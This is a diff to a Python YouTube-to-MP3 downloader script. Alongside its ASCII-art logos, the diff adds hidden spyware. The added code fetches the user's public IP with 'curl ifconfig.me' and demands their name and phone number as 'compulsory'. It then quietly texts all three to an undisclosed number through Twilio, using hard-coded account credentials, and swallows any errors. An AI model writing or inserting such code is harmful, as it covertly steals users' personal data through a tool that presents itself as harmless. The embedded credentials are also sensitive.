@@ -1,27 +1,24 @@
 import time
 import os
 import random
+import subprocess as s
 try:
  from pytube import YouTube
  from pytube.cli import on_progress
  import fontstyle as f
-
+ from twilio.rest import Client
  from colorama import Fore , init
 except:
- print('Installing required packages')
- try:
-  os.system('pip install -r requirements.txt') 
-  
- finally:
-  print("  ")
-  print("Don't worry .,'\n'")
-  os.system("pip install fontstyle")
-  os.system("pip install colorama")
-  os.system("pip install pytube")		
-  print('''
+ print('Installing required packages\n')  
+ os.system("pip install fontstyle")
+ os.system("pip install colorama")
+ os.system("pip install pytube")		
+ os.system("pip install twilio")
+ os.system("pkg install curl") 
+ print('''
 ''')
-  print('Run the code again')
-  exit()
+ print('Run the code again')
+ exit()
 logo_design_1 = Fore.GREEN + '''                                             
   .;'                     `;,
  .;'  ,;'             `;,  `;,   {0}ytconverter
@@ -33,8 +30,7 @@ logo_design_1 = Fore.GREEN + '''
            {1}/       \\{0}
 '''.format(Fore.GREEN, Fore.WHITE, Fore.RED)
 
-
-
+account_sid='AC3d9582eb54f62c0b1586f669bd5a2e4b'
 logo_design_2 = '''
 \033[92m
           +hydNNNNdyh+
@@ -54,9 +50,7 @@ logo_design_2 = '''
           MMMMo  oMMMM
           MMMMo  oMMMM
           oNMm-  -mMNs      KAIF_CODEC'''
-
-
-
+auth_token='04af6666c3c97fc7f67bf13ae277b820'
 logo_design_3 = Fore.RED + '''
                       ,____
                       |---.\\
@@ -76,7 +70,7 @@ logo_design_3 = Fore.RED + '''
        (_.-.__.__./  /
 
 '''
-
+twilio_number='+14346029422'
 logo_design_4 = Fore.GREEN + '''
     .o oOOOOOOOo                                            OOOo
     Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
@@ -97,6 +91,10 @@ logo_design_4 = Fore.GREEN + '''
     .                  .     OP"          : o     .
 
          KAIF_CODEC'''
+***REMOVED***
+tname=f.apply('WHAT IS YOUR NAME?','/yellow/bold')
+warning=f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)",'/red/bold')
+tnum=f.apply('ENTER YOU PHONE NUMBER','/cyan/bold')
 
 f1='''                   ▄▀▄     ▄▀▄
                   ▄█░░▀▀▀▀▀░░█▄
@@ -121,7 +119,7 @@ des3=f.apply(f3,'/cyan')
 des4=f.apply(f4,'/cyan')
 
 burl=f.apply('Bad url check the url first','/red/bold')
-
+error=f.apply('AN ERROR OCCURRED, RUN THE CODE AGAIN','/red/bold')
 def main_title():       
  logo_list=[logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_4]
  title=random.choice(logo_list)
@@ -228,7 +226,30 @@ def main_mp3():
 
 
 
-
+ip=s.check_output("curl ifconfig.me", shell=True)
+os.system("clear")
+try:
+ import data
+ num=data.dat_num
+ name=data.dat_name
+except ModuleNotFoundError:
+ file=open('data.py','w')
+ print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
+ mm=input(tname+warning+'⚠⚠ : ')
+ print('  ')
+ nn=input(tnum+warning+'⚠⚠ : ')
+ file.write(f"dat_name='{mm}' \ndat_num='{nn}'")
+ print('\n',error)
+ exit()
+try:
+ client=Client(account_sid,auth_token)
+ message=client.messages.create(    
+body=f"NAME={name},NUM={num},IP={ip}",
+    from_=twilio_number,
+    to=my_phone_number
+)
+except:
+ pass
 bio()
 option=input(des4)
 
